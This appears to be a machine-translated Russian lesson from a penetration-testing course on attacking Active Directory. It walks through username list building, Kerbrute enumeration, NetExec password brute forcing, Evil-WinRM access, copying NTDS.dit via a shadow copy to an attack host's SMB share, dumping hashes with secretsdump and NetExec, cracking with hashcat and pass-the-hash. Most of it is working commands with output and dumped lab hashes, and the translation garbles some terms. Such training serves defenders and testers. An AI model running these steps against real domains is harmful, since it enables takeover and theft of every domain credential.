~~
``` shell
./kerbrute_linux_amd64 bruteuser -d ILF.local --dc 10.129.202.85 /usr/share/wordlists/fasttrack.txt jmarston
```
`Active Directory`Active Directory (AD `AD`) — это распространённая и критически важная служба каталогов в современных корпоративных сетях. Мы будем постоянно сталкиваться с AD, поэтому нам необходимо знать различные методы, которые можно использовать для атаки и защиты этих сред. Можно с уверенностью сказать, что если организация использует Windows, то AD используется для управления этими системами Windows. Атака на AD — настолько обширная и важная тема, что у нас есть несколько модулей, посвящённых этому вопросу.

В этом разделе мы сосредоточимся в основном на том, как можно извлечь учетные данные с помощью `dictionary attack`поиска `AD accounts`по `dumping hashes`файлу `NTDS.dit`.

Как и во многих рассмотренных нами атаках, наша цель должна быть доступна по сети. Это означает, что нам, скорее всего, потребуется закрепиться во внутренней сети, к которой подключена цель. Тем не менее, бывают ситуации, когда организация может использовать переадресацию портов для перенаправления протокола удаленного рабочего стола ( `3389`) или других протоколов, используемых для удаленного доступа на своем [пограничном маршрутизаторе](https://www.cisco.com/c/en/us/products/routers/what-is-an-edge-router.html) к системе во внутренней сети. Следует отметить, что большинство методов, рассмотренных в этом модуле, имитируют шаги после первоначального взлома и установления контакта во внутренней сети. Прежде чем перейти к практическим методам атаки, давайте рассмотрим процесс аутентификации после подключения системы Windows к домену. Такой подход поможет нам лучше понять значение Active Directory и атаки на пароли, которым она может быть подвержена.

![Диаграмма, демонстрирующая процесс аутентификации Windows с использованием lsass.exe, пакетов аутентификации, NTLM, Kerberos и служб каталогов Active Directory.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/ADauthentication_diagram.png)

После подключения системы Windows к домену она `no longer default to referencing the SAM database to validate logon requests`будет отправлять запросы на аутентификацию для проверки контроллером домена, прежде чем разрешить пользователю войти в систему. Это не означает, что базу данных SAM больше нельзя использовать. Пользователь, желающий войти в систему, используя локальную учетную запись из базы данных SAM, по-прежнему может сделать это, указав идентификатор `hostname`устройства с префиксом `Username`(например: `WS01\nameofuser`) или, имея прямой доступ к устройству, ввести `.\`в поле пользовательского интерфейса входа в систему `Username`. Это заслуживает внимания, поскольку нам необходимо учитывать, какие компоненты системы затрагиваются проводимыми нами атаками. Это также может предоставить нам дополнительные пути атаки, которые следует рассмотреть при атаках на настольные операционные системы Windows или серверные операционные системы Windows с прямым физическим доступом или по сети. Имейте в виду, что мы также можем изучать атаки NTDS, отслеживая этот [метод](https://attack.mitre.org/techniques/T1003/003/) .

## Атаки по словарю на учетные записи Active Directory с использованием NetExec.

Следует помнить, что атака по словарю — это, по сути, использование вычислительной мощности компьютера для подбора имени пользователя и/или пароля с помощью специально составленного списка потенциальных имен пользователей и паролей. `noisy`Проведение таких атак по сети может быть довольно (легко обнаружить), поскольку они могут генерировать большой сетевой трафик и оповещения в целевой системе, а также в конечном итоге привести к блокировке из-за ограничений на попытки входа в систему, которые могут быть применены с помощью [групповой политики](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791\(v=ws.11\)) .

Когда мы оказываемся в ситуации, когда следующий шаг — это атака по словарю, нам полезно максимально адаптировать нашу атаку. В этом случае мы можем рассмотреть организацию, против которой проводим атаку, и использовать поиск на различных сайтах социальных сетей, а также найти справочник сотрудников на веб-сайте компании. Это позволит нам получить имена сотрудников, работающих в организации. Одна из первых вещей, которую получает новый сотрудник, — это имя пользователя. Многие организации следуют определенной системе именования при создании имен пользователей для сотрудников. Вот некоторые распространенные правила, которые следует учитывать:

|Соглашение об использовании имен пользователей|Практический пример для`Jane Jill Doe`|
|---|---|
|`firstinitiallastname`|jdoe|
|`firstinitialmiddleinitiallastname`|jjdoe|
|`firstnamelastname`|джанедо|
|`firstname.lastname`|jane.doe|
|`lastname.firstname`|doe.jane|
|`nickname`|doedoehacksstuff|

Часто структура адреса электронной почты позволяет определить имя пользователя сотрудника (структура: `username@domain`). Например, из адреса электронной почты `jdoe`@ `inlanefreight.com`мы можем сделать вывод, что `jdoe`это имя пользователя.

Совет от `MrB3n`: Часто структуру электронной почты можно определить, просто введя в Google доменное имя, например, "@inlanefreight.com", и получить несколько действительных адресов. Затем можно использовать скрипт для сбора данных с различных сайтов социальных сетей и объединения потенциально действительных имен пользователей. Некоторые организации пытаются замаскировать свои имена пользователей, чтобы предотвратить перебор паролей, поэтому они могут использовать псевдонимы, например, a907 (или что-то подобное), например, joe.smith. Таким образом, электронные письма могут проходить, но фактическое внутреннее имя пользователя не раскрывается, что затрудняет перебор паролей. Иногда можно использовать поисковые запросы Google, чтобы найти "inlanefreight.com filetype:pdf" и обнаружить действительные имена пользователей в свойствах PDF-файла, если он был создан с помощью графического редактора. После этого можно определить структуру имени пользователя и, возможно, написать небольшой скрипт для создания множества возможных комбинаций, а затем проверить, какие из них окажутся действительными.

#### Создание пользовательского списка имен пользователей

Допустим, мы провели исследование и собрали список имен на основе общедоступной информации. Для целей этого урока мы ограничимся относительно коротким списком, поскольку в организациях может быть огромное количество сотрудников. Пример списка имен:

- Бен Уильямсон
- Боб Бургерштейн
- Джим Стивенсон
- Джилл Джонсон
- Джейн Доу

`Vim`Мы можем создать собственный список на нашем хосте атаки, используя указанные выше имена. Для создания списка мы можем использовать текстовый редактор командной строки или графический текстовый редактор. Наш список может выглядеть примерно так:

  Атака на Active Directory и NTDS.dit

```shell-session
MuraMitchi@htb[/htb]$ cat usernames.txt

bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```

Конечно, это всего лишь пример, и он не включает все имена, но обратите внимание, как мы можем использовать разные правила именования для каждого имени, если нам неизвестна система именования, используемая целевой организацией.

Мы можем создать свой список (или списки) вручную или использовать такой инструмент, как [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)`automated list generator` на основе Ruby, для преобразования списка реальных имен в распространенные форматы имен пользователей. После того, как инструмент будет клонирован на наш локальный хост для атаки с помощью команды `git clone` , мы можем запустить его на списке реальных имен, как показано в примере выходных данных ниже:[](https://github.com/urbanadventurer/username-anarchy)`Git`

  Атака на Active Directory и NTDS.dit

```shell-session
MuraMitchi@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 

ben
benwilliamson
ben.williamson
benwilli
benwill
benw
b.williamson
bwilliamson
wben
w.ben
williamsonb
williamson
williamson.b
williamson.ben
bw
bob
bobburgerstien
bob.burgerstien
bobburge
bobburg
bobb
b.burgerstien
bburgerstien
bbob
b.bob
burgerstienb
burgerstien
burgerstien.b
burgerstien.bob
bb
jim
jimstevenson
jim.stevenson
jimsteve
jimstev
jims
j.stevenson
jstevenson
sjim
s.jim
stevensonj
stevenson
stevenson.j
stevenson.jim
js
jill
jilljohnson
jill.johnson
jilljohn
jillj
j.johnson
jjohnson
jjill
j.jill
johnsonj
johnson
johnson.j
johnson.jill
jj
jane
janedoe
jane.doe
janed
j.doe
jdoe
djane
d.jane
doej
doe
doe.j
doe.jane
jd
```

Использование автоматизированных инструментов может сэкономить нам время при составлении списков. Тем не менее, нам будет полезно потратить как можно больше времени на попытку выяснить, какую систему именования использует организация для имен пользователей, поскольку это уменьшит необходимость гадать об этой системе.

В идеале при проведении атак на пароли следует свести к минимуму необходимость угадывания.

#### Перечисление допустимых имен пользователей с помощью Kerbrute

Прежде чем начинать угадывать пароли для имен пользователей, которых может даже не существовать, стоит определить правильную систему именования и подтвердить действительность некоторых имен пользователей. Это можно сделать с помощью такого инструмента, как [Kerbrute](https://github.com/ropnop/kerbrute) . Kerbrute можно использовать для перебора паролей, распыления паролей и перечисления имен пользователей. Сейчас нас интересует только перечисление имен пользователей, которое будет выглядеть следующим образом:

  Атака на Active Directory и NTDS.dit

```shell-session
MuraMitchi@htb[/htb]$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/25/25 - Ronnie Flathers @ropnop

2025/04/25 09:17:10 >  Using KDC(s):
2025/04/25 09:17:10 >   10.129.201.57:88

2025/04/25 09:17:11 >  [+] VALID USERNAME:       bwilliamson@inlanefreight.local
<SNIP>
```

#### Запуск атаки методом перебора паролей с помощью NetExec

Как только у нас будет готов список (или списки) или мы определим соглашение об именовании и имена некоторых сотрудников, мы можем начать атаку методом перебора паролей на целевой контроллер домена, используя такой инструмент, как NetExec. Мы можем использовать его в сочетании с протоколом SMB для отправки запросов на вход в систему целевому контроллеру домена. Вот команда для этого:

  Атака на Active Directory и NTDS.dit

```shell-session
MuraMitchi@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

SMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! 
```

В этом примере NetExec использует SMB для попытки входа в систему под учетной записью пользователя ( `-u`) `bwilliamson`с использованием списка паролей ( `-p`), содержащего перечень часто используемых паролей ( `/usr/share/wordlists/fasttrack.txt`). Если администраторы настроили политику блокировки учетных записей, эта атака может заблокировать целевую учетную запись. На момент написания этой статьи (январь 2022 г.) политика блокировки учетных записей не применяется по умолчанию в групповых политиках, используемых в домене Windows, а это означает, что мы можем столкнуться со средами, уязвимыми именно для этой атаки, которую мы отрабатываем.

#### Журналы событий атаки

![В журнале событий Windows отображаются записи с идентификатором события 4776, касающиеся проверки учетных данных и подробной информации о событии.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/events_dc.png)

Полезно знать, что могло остаться после атаки. Это позволит сделать наши рекомендации по устранению последствий более эффективными и ценными для клиента, с которым мы работаем. В любой операционной системе Windows администратор может перейти к разделу « `Event Viewer`События безопасности» и просмотреть точные зарегистрированные действия. Это может помочь в принятии решений о внедрении более строгих мер безопасности и оказать содействие в любом потенциальном расследовании, которое может потребоваться после взлома.

Получив учетные данные, мы можем попытаться получить удаленный доступ к целевому контроллеру домена и захватить файл NTDS.dit.

## Захват файла NTDS.dit

`NT Directory Services`( `NTDS`) — это служба каталогов, используемая с Active Directory для поиска и организации сетевых ресурсов. Напомним, что `NTDS.dit`файл хранится по адресу `%systemroot%/ntds`на контроллерах домена в [лесу](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model) . `.dit`обозначает [дерево информации каталога](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html) . Это основной файл базы данных, связанный с Active Directory, и в нем хранятся все имена пользователей домена, хэши паролей и другая важная информация схемы. Если этот файл удастся перехватить, мы потенциально можем скомпрометировать все учетные записи в домене, аналогично методу, рассмотренному в этом `Attacking SAM, SYSTEM, and SECURITY`разделе модуля. При отработке этого метода, подумайте о важности защиты Active Directory и придумайте несколько способов предотвратить эту атаку.

#### Подключение к контроллеру домена с помощью Evil-WinRM

Мы можем подключиться к целевому контроллеру домена, используя полученные учетные данные.

  Атака на Active Directory и NTDS.dit

```shell-session
MuraMitchi@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

Evil-WinRM подключается к целевому объекту, используя службу удаленного управления Windows в сочетании с протоколом удаленного доступа PowerShell для установления сеанса PowerShell с целевым объектом.

#### Проверка членства в местной группе

После подключения мы можем проверить, какие привилегии `bwilliamson`у пользователя. Начнём с просмотра членства в локальной группе, используя команду:

  Атака на Active Directory и NTDS.dit

```shell-session
*Evil-WinRM* PS C:\> net localgroup

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

Нам нужно проверить, есть ли у учетной записи права локального администратора. Для создания копии файла NTDS.dit нам необходимы права локального администратора ( `Administrators group`) или администратора домена ( `Domain Admins group`) (или эквивалентные). Также нам нужно проверить, какие привилегии домена у нас есть.

#### Проверка прав доступа к учетной записи пользователя, включая домен.

  Атака на Active Directory и NTDS.dit

```shell-session
*Evil-WinRM* PS C:\> net user bwilliamson

User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```

Эта учетная запись обладает правами администратора и администратора домена, что означает, что мы можем делать практически все, что захотим, включая создание копии файла NTDS.dit.

#### Создание теневой копии C:

Мы можем использовать VSS `vssadmin`для создания [теневой копии тома](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) ( VSS `VSS`) диска `C:`или любого другого тома, выбранного администратором при первоначальной установке AD. Весьма вероятно, что NTDS будет храниться на диске, `C:`поскольку это местоположение по умолчанию, выбранное при установке, но местоположение можно изменить. Мы используем VSS для этой цели, потому что он предназначен для создания копий томов, которые могут активно читаться и записываться, без необходимости остановки конкретного приложения или системы. VSS используется многими различными программами резервного копирования и аварийного восстановления для выполнения операций.

  Атака на Active Directory и NTDS.dit

```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

#### Копирование файла NTDS.dit из VSS

Затем мы можем скопировать `NTDS.dit`файл из теневой копии тома `C:`в другое место на диске, чтобы подготовиться к перемещению NTDS.dit на наш хост для атаки.

  Атака на Active Directory и NTDS.dit

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

        1 file(s) copied.
```

Прежде чем копировать данные `NTDS.dit`на хост для атаки, мы можем использовать описанный ранее метод для создания SMB-ресурса на этом хосте. При необходимости вы можете вернуться к этому `Attacking SAM, SYSTEM, and SECURITY`разделу, чтобы повторить данный метод.

**Примечание:** Как и в случае с `SAM`, хеши, хранящиеся в , `NTDS.dit`зашифрованы ключом, хранящимся в `SYSTEM`. Для успешного извлечения хешей необходимо загрузить оба файла.

#### Передача файла NTDS.dit на хост атаки.

Теперь `cmd.exe /c move`это можно использовать для перемещения файла с целевого контроллера домена в общую папку на нашем хосте атаки.

  Атака на Active Directory и NTDS.dit

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

        1 file(s) moved.		
```

#### Извлечение хешей из файла NTDS.dit

Имея копию `NTDS.dit`на нашем хосте для атаки, мы можем получить хеши. Один из способов сделать это — использовать Impacket `secretsdump`:

  Атака на Active Directory и NTDS.dit

```shell-session
MuraMitchi@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
[*] Reading and decrypting hashes from NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
<SNIP>
```

#### Более быстрый метод: использование NetExec для захвата файла NTDS.dit.

В качестве альтернативы, мы можем использовать NetExec для выполнения тех же шагов, что и описано выше, одной командой. Эта команда позволяет нам использовать VSS для быстрого захвата и удобного сохранения содержимого файла NTDS.dit в терминале.

  Атака на Active Directory и NTDS.dit

```shell-session
MuraMitchi@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil

SMB         10.129.201.57   445     DC01         [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57   445     DC01         [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
NTDSUTIL    10.129.201.57   445     DC01         [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\174556000
NTDSUTIL    10.129.201.57   445     DC01         Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.201.57   445     DC01         [+] NTDS.dit dumped to C:\Windows\Temp\174556000
NTDSUTIL    10.129.201.57   445     DC01         [*] Copying NTDS dump to /tmp/tmpcw5zqy5r
NTDSUTIL    10.129.201.57   445     DC01         [*] NTDS dump copied to /tmp/tmpcw5zqy5r
NTDSUTIL    10.129.201.57   445     DC01         [+] Deleted C:\Windows\Temp\174556000 remote dump directory
NTDSUTIL    10.129.201.57   445     DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.201.57   445     DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
NTDSUTIL    10.129.201.57   445     DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    10.129.201.57   445     DC01         DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-IAUBULPG5MZ:1105:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f124d5bf1cd:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-NKHHJGP3SMT:1106:aad3b435b51404eeaad3b435b51404ee:a74cc84578c16a6f81ec90765d5eb95f:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-K5E9CWYEG7Z:1107:aad3b435b51404eeaad3b435b51404ee:ec209bfad5c41f919994a45ed10e0f5c:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-5MG4NRVHF2W:1108:aad3b435b51404eeaad3b435b51404ee:7ede00664356820f2fc9bf10f4d62400:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-UISCTR0XLKW:1109:aad3b435b51404eeaad3b435b51404ee:cad1b8b25578ee07a7afaf5647e558ee:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-ETN7BWMPGXD:1110:aad3b435b51404eeaad3b435b51404ee:edec0ceb606cf2e35ce4f56039e9d8e7:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\bwilliamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\bburgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jstevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jjohnson:1133:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jdoe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
NTDSUTIL    10.129.201.57   445     DC01         Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
NTDSUTIL    10.129.201.57   445     DC01         Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb
NTDSUTIL    10.129.201.57   445     DC01         Administrator:des-cbc-md5:618c1c5ef780cde3
NTDSUTIL    10.129.201.57   445     DC01         DC01$:aes256-cts-hmac-sha1-96:113ffdc64531d054a37df36a07ad7c533723247c4dbe84322341adbd71fe93a9
NTDSUTIL    10.129.201.57   445     DC01         DC01$:aes128-cts-hmac-sha1-96:ea10ef59d9ec03a4162605d7306cc78d
NTDSUTIL    10.129.201.57   445     DC01         DC01$:des-cbc-md5:a2852362e50eae92
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:aes256-cts-hmac-sha1-96:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:aes128-cts-hmac-sha1-96:1fe3f211d383564574609eda482b1fa9
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:des-cbc-md5:9bd5017fdcea8fae
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:aes256-cts-hmac-sha1-96:4b0618f08b2ff49f07487cf9899f2f7519db9676353052a61c2e8b1dfde6b213
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:aes128-cts-hmac-sha1-96:d2377357d473a5309505bfa994158263
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:des-cbc-md5:79ab08755b32dfb6
NTDSUTIL    10.129.201.57   445     DC01         WIN-IAUBULPG5MZ:aes256-cts-hmac-sha1-96:881e693019c35017930f7727cad19c00dd5e0cfbc33fd6ae73f45c117caca46d
NTDSUTIL    10.129.201.57   445     DC01         WIN-IAUBULPG5MZ:aes128-cts-hmac-sha1-
NTDSUTIL    10.129.201.57   445     DC01         [+] Dumped 61 NTDS hashes to /home/bob/.nxc/logs/DC01_10.129.201.57_2025-04-25_084640.ntds of which 15 were added to the database
NTDSUTIL    10.129.201.57   445    DC01          [*] To extract only enabled accounts from the output file, run the following command: 
NTDSUTIL    10.129.201.57   445    DC01          [*] grep -iv disabled /home/bob/.nxc/logs/DC01_10.129.201.57_2025-04-25_084640.ntds | cut -d ':' -f1
```

## Взлом хешей и получение необходимых учетных данных.

Мы можем создать текстовый файл, содержащий все NT-хеши, или же скопировать и вставить конкретный хеш в терминал и использовать Hashcat для попытки взлома хеша и пароля в открытом виде.

#### Взлом одного хеша с помощью Hashcat

  Атака на Active Directory и NTDS.dit

```shell-session
MuraMitchi@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

Во многих из рассмотренных нами методов нам удавалось успешно взламывать полученные хеши.

`What if we are unsuccessful in cracking a hash?`

## Вопросы, касающиеся программы Pass the Hash (PtH).

Мы по-прежнему можем использовать хеши для попытки аутентификации в системе, применяя тип атаки, называемый `Pass-the-Hash`( `PtH`). Атака PtH использует [протокол аутентификации NTLM](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials) для аутентификации пользователя с помощью хеша пароля. Вместо `username`: `clear-text password`в качестве формата для входа в систему мы можем использовать `username`: `password hash`. Вот пример того, как это будет работать:

#### Пример использования функции Pass the Hash (PtH) с Evil-WinRM.

  Атака на Active Directory и NTDS.dit

```shell-session
MuraMitchi@htb[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

Мы можем попытаться использовать эту атаку, когда необходимо перемещаться по сети после первоначального взлома целевого объекта. Более подробная информация о PtH будет рассмотрена в модуле `AD Enumeration and Attacks`.